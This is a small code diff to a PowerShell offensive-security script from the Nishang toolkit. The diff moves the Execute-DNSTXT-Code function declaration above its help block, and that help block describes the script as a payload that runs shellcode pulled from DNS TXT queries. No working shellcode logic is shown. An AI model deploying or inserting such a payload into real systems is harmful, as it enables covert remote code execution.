@@ -1,3 +1,5 @@
+function Execute-DNSTXT-Code
+{
 <#
 .SYNOPSIS
 Payload which could execute shellcode from DNS TXT queries.
@@ -35,11 +37,6 @@ https://github.com/samratashok/nishang
 The code execution logic is based on this post by Matt.
 http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html
 #>
-
-
-
-function Execute-DNSTXT-Code
-{
     [CmdletBinding()] Param(
         [Parameter(Position = 0, Mandatory = $True)]
         [String]
